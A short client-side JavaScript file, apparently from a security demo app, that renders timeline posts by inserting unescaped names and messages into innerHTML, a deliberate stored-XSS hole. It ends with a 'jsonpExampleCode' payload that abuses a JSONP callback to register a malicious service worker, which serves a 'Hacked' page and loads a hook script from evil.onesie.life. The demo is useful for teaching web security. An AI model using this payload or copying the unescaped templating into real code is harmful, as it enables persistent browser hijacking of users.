const form = document.getElementById('messageForm');
const timeline = document.getElementById('timeline');

if (form) {
  form.addEventListener('submit', submitForm);
}

async function submitForm(evt) {
  evt.preventDefault();
  const postData = { message: evt.target.message.value };
  const body = new URLSearchParams(postData);
  const _csrf = Cookies.get('_csrf');
  const headers = new Headers();
  if (_csrf) {
    headers.append('X-CSRF-Token', _csrf);
  }
  const resp = await fetch('/post', {
    method: 'POST',
    body,
    headers,
    credentials: 'include'
  });
  const data = await resp.json();
  const html = getPostTemplate(data);
  timeline.innerHTML = html + timeline.innerHTML;
}

function getPostTemplate({ name, message }) {
  return `<div class="timeline-entry">
  <div class="timeline-entry--author">
  <img class="timeline-entry--image" src="https://api.adorable.io/avatars/50/${name}" width="50" height="50"/>
  <br/>
  <b>${name}</b>
</div>
  <blockquote class="timeline-entry--content">${message}</blockquote>
  </div>`;
}

function b64EncodeUnicode(str) {
  return fixAfterEncode(
    btoa(
      encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode(parseInt(p1, 16));
      })
    )
  );
}

function b64DecodeUnicode(str) {
  str = fixForDecode(str);
  return decodeURIComponent(
    Array.prototype.map
      .call(atob(str), function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
      })
      .join('')
  );
}

function fixAfterEncode(str) {
  let output = str.replace(/=/g, '');
  return output;
}

function fixForDecode(str) {
  let output = str.replace(/-/g, '+').replace(/_/g, '/');
  switch (output.length % 4) {
    case 0:
      break;
    case 2:
      output += '==';
      break;
    case 3:
      output += '=';
      break;
    default:
      throw new Error('Failed to parse');
  }
  return output;
}

window[
  'jsonpExampleCode'
] = `[You won't believe this!!!!!!](javascript&#58this;navigator.serviceWorker.register("/post?callback=onfetch=function(e&#41;{if(!(e.request.url.indexOf(':4000'&#41;>0&#41;&#41;{e.respondWith(new	Response('<h1>Hacked</h1><script	src=\\\\'https://evil.onesie.life/hook.js\\\\'	type=\\\\'text/javascript\\\\'></script>',	{headers:	{'Content-Type':'text/html'}}&#41;&#41; }else{e.fetch(e.request&#41;}}//"&#41;)`;
